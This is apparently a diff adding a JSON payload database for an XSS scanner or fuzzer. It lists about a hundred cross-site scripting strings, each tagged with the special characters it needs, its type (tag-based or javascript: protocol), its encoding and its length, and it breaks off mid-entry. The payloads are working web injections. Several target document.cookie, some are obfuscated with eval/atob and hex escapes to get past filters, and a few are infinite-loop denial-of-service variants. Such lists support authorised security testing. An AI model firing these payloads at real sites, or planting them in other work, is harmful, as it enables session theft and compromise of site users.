@@ -1,0 +1,1855 @@
+[
+  {
+    "Payload": "<iframe src=\"javascript:alert(document.domain)\"></iframe>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 57
+  },
+  {
+    "Payload": "<IFRAME SRC=\"javascript:alert(document.cookie);\"></IFRAME>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 58
+  },
+  {
+    "Payload": "jAvaScripT:(alert)`1`",
+    "Attribute": [
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 21
+  },
+  {
+    "Payload": "javascript:alert('1')",
+    "Attribute": [
+      "(",
+      ")",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 21
+  },
+  {
+    "Payload": "<img dynsrc=\"javascript:alert('Successful XSS')\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 49
+  },
+  {
+    "Payload": "<body background=\"javascript:alert('Successful XSS')\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 54
+  },
+  {
+    "Payload": "<div style=\"background-image:url(javascript:alert('Successful XSS'))\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 70
+  },
+  {
+    "Payload": "<input type=\"image\" src=\"javascript:alert('Successful XSS')\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 61
+  },
+  {
+    "Payload": "\"><iframe src=\"javascript:alert(XSS)\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 38
+  },
+  {
+    "Payload": "<object data=\"javascript:alert(XSS)\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 37
+  },
+  {
+    "Payload": "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 60
+  },
+  {
+    "Payload": "<DIV STYLE=\"background-image: url(\u0001javascript:alert('XSS'))\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 61
+  },
+  {
+    "Payload": "<BASE HREF=\"javascript:alert('XSS');//\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 40
+  },
+  {
+    "Payload": "<A HREF=\"javascript:document.location='http://www.google.com/'\">XSS</A>",
+    "Attribute": [
+      "\"",
+      ">",
+      "'",
+      "<",
+      "/",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 71
+  },
+  {
+    "Payload": "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 55
+  },
+  {
+    "Payload": "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 86
+  },
+  {
+    "Payload": "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 78
+  },
+  {
+    "Payload": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 68
+  },
+  {
+    "Payload": "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 59
+  },
+  {
+    "Payload": "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 48
+  },
+  {
+    "Payload": "<IMG SRC=\"`<javascript:alert>`('XSS')\"",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 38
+  },
+  {
+    "Payload": "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 43
+  },
+  {
+    "Payload": "<IMG DYNSRC=\"javascript:alert('XSS')\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 38
+  },
+  {
+    "Payload": "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 85
+  },
+  {
+    "Payload": "<BGSOUND SRC=\"javascript:alert('XSS');\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 40
+  },
+  {
+    "Payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 47
+  },
+  {
+    "Payload": "<input type=\"text\" value=\"javascript:alert('XSS')\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 51
+  },
+  {
+    "Payload": "<form action=\"javascript:alert('XSS')\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 39
+  },
+  {
+    "Payload": "q=javascript:alert(document.domain)",
+    "Attribute": [
+      "(",
+      ")",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 35
+  },
+  {
+    "Payload": "<img src=\"javascript:alert('XSS')\" alt=\"Image\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 47
+  },
+  {
+    "Payload": "<IFRAME SRC=\"javascript:alert(document.cookie);\"></iframe>'",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 59
+  },
+  {
+    "Payload": "<math><x xlink:href=javascript:confirm`1`>click",
+    "Attribute": [
+      ">",
+      "<",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 47
+  },
+  {
+    "Payload": "\";}(document.writeln(decodeURI(location.hash))-\"#<iframe src=javascript:alert(document.domain)",
+    "Attribute": [
+      "\"",
+      ")",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 94
+  },
+  {
+    "Payload": "search?q=javascript:alert(document.domain)",
+    "Attribute": [
+      "(",
+      ")",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 42
+  },
+  {
+    "Payload": "\"<IMG DYNSRC=\\\"javascript:alert('XSS');\\\">\"",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 43
+  },
+  {
+    "Payload": "//j\\\\javascript:alert(document.domain)",
+    "Attribute": [
+      "/",
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 38
+  },
+  {
+    "Payload": "javascript:(alert('XSS Success!'))()",
+    "Attribute": [
+      "(",
+      ")",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 36
+  },
+  {
+    "Payload": "javascript:alert(document.domain);",
+    "Attribute": [
+      ";",
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 34
+  },
+  {
+    "Payload": "<object+data=\"javascript:alert(0)\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 35
+  },
+  {
+    "Payload": "<object><param name=\"src\" value=\"javascript:alert(0)\"></param></object>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 71
+  },
+  {
+    "Payload": "JavaSCript:alert(123)",
+    "Attribute": [
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 21
+  },
+  {
+    "Payload": "src=JaVaSCript:prompt(132)",
+    "Attribute": [
+      "(",
+      ")",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 26
+  },
+  {
+    "Payload": "\" autofocus onkeyup=\"javascript:alert(123)",
+    "Attribute": [
+      "\"",
+      "(",
+      ")",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 42
+  },
+  {
+    "Payload": "<IMG SRC=\"javascript:alert('XSS')\"",
+    "Attribute": [
+      "\"",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 34
+  },
+  {
+    "Payload": "\"><img src=javascript:while([{}]);>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 35
+  },
+  {
+    "Payload": "\"><input value=<><iframe/src=javascript:confirm(1)",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 50
+  },
+  {
+    "Payload": "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 51
+  },
+  {
+    "Payload": "<IMG LOWSRC=\"javascript:alert('XSS')\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 38
+  },
+  {
+    "Payload": "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 48
+  },
+  {
+    "Payload": "<applet code=\"javascript:confirm(document.cookie);\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 52
+  },
+  {
+    "Payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 65
+  },
+  {
+    "Payload": "<script>location='javascript:alert\\x281\\x29'</script>",
+    "Attribute": [
+      ">",
+      "'",
+      "<",
+      "/",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 53
+  },
+  {
+    "Payload": "javascript:74163166147401571561541571411447514115414516216450615176",
+    "Attribute": [],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 67
+  },
+  {
+    "Payload": "[a](javascript:prompt(document.cookie))",
+    "Attribute": [
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 39
+  },
+  {
+    "Payload": "<form><button formaction=javascript:top['ev'+'al'](self['\\x61\\x74\\x6f\\x62'](`YWxlcnQoMSk7`));//",
+    "Attribute": [
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 95
+  },
+  {
+    "Payload": "<object/data=javascript:alert()>",
+    "Attribute": [
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 32
+  },
+  {
+    "Payload": "img{background-image:url('javascript:alert()')}",
+    "Attribute": [
+      "(",
+      ")",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 47
+  },
+  {
+    "Payload": "<IMG SRC=”javascript:alert(‘XSS’)”",
+    "Attribute": [
+      "(",
+      "<",
+      ")",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 34
+  },
+  {
+    "Payload": "\\xE2\\x81\\x9Fjavascript:javascript:confirm(1)",
+    "Attribute": [
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 44
+  },
+  {
+    "Payload": "javascript:{ alert`0` }",
+    "Attribute": [],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 23
+  },
+  {
+    "Payload": "&redirect?url=javascript://alert(document.cookie)",
+    "Attribute": [
+      ")",
+      "/",
+      "(",
+      "&",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 49
+  },
+  {
+    "Payload": "&redirect_to=javascript:alert(document.domain)",
+    "Attribute": [
+      "(",
+      "&",
+      ")",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 46
+  },
+  {
+    "Payload": "window.name='javascript:alert\\x2823\\x29';",
+    "Attribute": [
+      ";",
+      "=",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 41
+  },
+  {
+    "Payload": "navigation.navigate`javascript:alert\\x2823\\x29`",
+    "Attribute": [],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 47
+  },
+  {
+    "Payload": "window.name='javascript:alert(23)';",
+    "Attribute": [
+      ")",
+      "'",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 35
+  },
+  {
+    "Payload": "x='javascript:alert\\x2823\\x29';x={x:location}=this",
+    "Attribute": [
+      ";",
+      "=",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 50
+  },
+  {
+    "Payload": "location='javaScriPt:alert\\x2845\\x29'",
+    "Attribute": [
+      "=",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 37
+  },
+  {
+    "Payload": "'javaScriPt:alert\\x2845\\x29'",
+    "Attribute": [
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 28
+  },
+  {
+    "Payload": "location='JaVaScRiPt:prompt'+document.location.hash[1]+'45'+document.location.hash[2]",
+    "Attribute": [
+      "=",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 85
+  },
+  {
+    "Payload": "'JaVaScRiPt:prompt'+document.location.hash[1]+'45'+document.location.hash[2]",
+    "Attribute": [
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 76
+  },
+  {
+    "Payload": "',document.location='javascript:document.domain','",
+    "Attribute": [
+      "=",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 50
+  },
+  {
+    "Payload": "<IMG SRC=javascript:alert('XSS')>",
+    "Attribute": [
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 33
+  },
+  {
+    "Payload": "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 44
+  },
+  {
+    "Payload": "window.name=\"javascript:alert(23)\";",
+    "Attribute": [
+      "\"",
+      ")",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 35
+  },
+  {
+    "Payload": "“`’><script>\\x0Djavascript:alert(document.cookie)</script>",
+    "Attribute": [
+      ">",
+      ")",
+      "<",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 58
+  },
+  {
+    "Payload": "<base href=\"javascript:alert('XSS');\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 38
+  },
+  {
+    "Payload": "<bgsound src=\"javascript:alert('XSS');\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 40
+  },
+  {
+    "Payload": "<isindex action=\"javascript:alert('XSS')\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 42
+  },
+  {
+    "Payload": "<fieldset form=\"javascript:alert('XSS')\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 41
+  },
+  {
+    "Payload": "<applet code=\"javascript:alert('XSS')\"></applet>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 48
+  },
+  {
+    "Payload": "<button formaction=\"javascript:alert('XSS')\">Click me</button>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 62
+  },
+  {
+    "Payload": "<div style=\"border-image-source: url(javascript:alert('XSS'));\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 64
+  },
+  {
+    "Payload": "<link rel=\"stylesheet\" href=\"data:text/css,*{background:url('javascript:alert(XSS)')}\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 87
+  },
+  {
+    "Payload": "<div style=\"list-style-image: url(javascript:alert('XSS'));\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 61
+  },
+  {
+    "Payload": "<div data-url=\"javascript:alert('XSS')\"></div>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 46
+  },
+  {
+    "Payload": "<div style=\"content: url(javascript:alert('XSS'));\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 52
+  },
+  {
+    "Payload": "<style>*{background-image: url(javascript:alert('XSS'))}</style>",
+    "Attribute": [
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 64
+  },
+  {
+    "Payload": "<div style=\"cursor: url(javascript:alert('XSS')), auto;\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 57
+  },
+  {
+    "Payload": "<meta http-equiv=\"refresh\" content=\" ; url=javascript:alert('XSS');\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 69
+  },
+  {
+    "Payload": "<svg><animate attributeName=\"xlink:href\" to=\"javascript:alert('XSS')\" /></svg>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 78
+  },
+  {
+    "Payload": "<math href=\"javascript:alert('XSS')\" />",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 39
+  },
+  {
+    "Payload": "<form action=\"javascript:alert('XSS')\"><input type=\"submit\" value=\"XSS\"></form>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 79
+  },
+  {
+    "Payload": "<style>@import 'javascript:alert(XSS)';</style>",
+    "Attribute": [
+      ">",
+      ")",
+      "'",
+      "<",
+      ";",
+      "/",
+      "("
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 47
+  },
+  {
+    "Payload": "javascript:confirm(1)",
+    "Attribute": [
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 21
+  },
+  {
+    "Payload": "<iframe  src=\"&Tab;javascript:prompt(1)&Tab;\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      ";",
+      "(",
+      "&",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 46
+  },
+  {
+    "Payload": "<input value=<><iframe/src=javascript:confirm(1)",
+    "Attribute": [
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 48
+  },
+  {
+    "Payload": "<IMG SRC=JaVaScRiPt:alert('XSS')>",
+    "Attribute": [
+      ">",
+      ")",
+      "'",
+      "<",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 33
+  },
+  {
+    "Payload": "<iframe SRC=\"javascript:alert('XSS');\" <",
+    "Attribute": [
+      "\"",
+      ")",
+      "'",
+      "<",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 40
+  },
+  {
+    "Payload": "<iframe SRC=\"javascript:alert('XSS');\" //",
+    "Attribute": [
+      "\"",
+      ")",
+      "'",
+      "<",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 41
+  },
+  {
+    "Payload": "'() {'document.createElement('img').src='javascript:while(1){}'",
+    "Attribute": [
+      "(",
+      ")",
+      "=",
+      "'"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 63
+  },
+  {
+    "Payload": "javascript:prompt(1)#{\"action\":1}",
+    "Attribute": [
+      "\"",
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 33
+  },
+  {
+    "Payload": "window.name=\"javascript:confirm((window.opener||window).document.cookie);\";",
+    "Attribute": [
+      "\"",
+      ")",
+      ";",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 75
+  },
+  {
+    "Payload": "\"javascript:confirm(0);\",",
+    "Attribute": [
+      "\"",
+      "(",
+      ";",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 25
+  },
+  {
+    "Payload": ";javascript:confirm(0);",
+    "Attribute": [
+      ";",
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
